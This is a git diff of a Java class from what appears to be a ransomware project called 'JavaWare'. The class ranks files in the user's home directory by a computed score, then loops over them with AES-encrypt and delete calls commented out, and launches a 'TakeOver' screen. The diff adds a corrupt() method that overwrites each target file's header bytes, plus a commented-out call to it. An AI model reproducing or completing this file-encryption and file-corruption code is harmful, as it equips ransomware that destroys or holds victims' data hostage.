@@ -32,16 +32,13 @@ import java.util.HashMap;
 import static java.util.Map.Entry.comparingByValue;
 import static java.util.stream.Collectors.toMap;
 
-
 public class FileScore {
 
     HashMap<String, Double> FileScore = new HashMap<>();
     AES aes;
-
     public void FileScore() throws Exception {
         aes = new AES();
-
-        File in = new File(System.getProperty("user.home") + File.separator + "output.txt");
+        File in = new File(System.getProperty("user.home") +  File.separator + "output.txt");
 
         try(BufferedReader br = new BufferedReader(new FileReader(in))) {
             String line;
@@ -56,9 +53,7 @@ public class FileScore {
                     } catch(NumberFormatException e) {
                         continue;
                     }
-
                 }
-
                 FileScore.put(file.getAbsolutePath(), gamma);
 
             }
@@ -68,18 +63,16 @@ public class FileScore {
             for(String f: newdirectoryScore.keySet()) {
                 File file = new File(f);
                 //aes.encrypt(file);
+                //corrupt(file);
                 //file.delete();
-                System.out.println("Encrypting " + file);
-
             }
             Application.launch(TakeOver.class, "JavaWare");
-
 
         }
 
     }
 
-    public double calculateBeta(File file) throws Exception {
+    public double calculateBeta(File file) {
 
         long lastModified = file.lastModified();
         Date lastModDate = new Date(lastModified);
@@ -118,6 +111,14 @@ public class FileScore {
         double beta = p * Math.exp(-lambda * a);
 
         return beta;
+    }
+
+    public void corrupt(File f) throws Exception {
+        RandomAccessFile rf = new RandomAccessFile(f, "rw");
+        rf.seek(0);
+        byte[] head = new byte[]{'a', 'Z', '1', '.', 't'};
+        rf.write(head);
+
     }
 
 }
